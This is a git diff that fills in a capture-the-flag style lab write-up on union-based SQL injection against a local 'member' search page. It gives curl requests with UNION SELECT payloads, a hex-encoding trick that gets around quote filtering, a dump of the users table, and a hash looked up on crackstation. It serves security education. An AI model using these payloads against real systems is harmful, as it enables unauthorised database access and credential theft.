@@ -1,4 +1,4 @@
-# Exercise Name
+# Union Based SQL Injection in search member page
 
 ## 📖 Vulnerability Explanation
 [Explain what the vulnerability is, how it works, and why it's dangerous. Include conditions required for exploitation if applicable.]
@@ -29,7 +29,11 @@ curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+table_schema%2Ctab
 
 ---
 
-- Dump columns of table users
+- Dump columns of table _users_
+
+```
+echo -n 'users' | xxd -p
+```
 
 ```
 0 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name=0x7573657273; -- -
@@ -58,15 +62,21 @@ curl -s 'http://localhost:9090/?page=member&id=0+UNION+SELECT+Commentaire%2Ccoun
 > IMAGE crakstation.net
 
 ```
-sha256sum =(echo -n 'fortytwo')
+echo -n 'fortytwo' | sha256sum
 ```
 
-## 🧰 Additional Resources Used *(Optional)*
-- [Tool/Script Name]: [Brief description of purpose]
-- Example: *Custom Python script to exploit XXE and read arbitrary files from the server.*
+## 🧰 Additional Resources Used
+
+We used ```https://crackstation.net/``` to crack the hash. This page doesn't really _crack_ the hash you provide, but performs a lookup on pre-computed hashes instead.
 
 ## 🔧 Fix
 [Describe how to fix the vulnerability]
 
 ## ☝️🤓 Advanced explanation
-[Provide advanced explanation for the bonus part]
+In this case, we could get the data from the database on the response page. However, there are many other scenarios that require other techniques to dump the data.
+
+- https://www.acunetix.com/websitesecurity/sql-injection2/
+
+Apart from the channel used to retrieve the data, there are other techniques that can be used to bypass filtering and perform SQLi. We used this as quotes were not working in our injection scenario.
+
+- https://portswigger.net/support/sql-injection-bypassing-common-filters
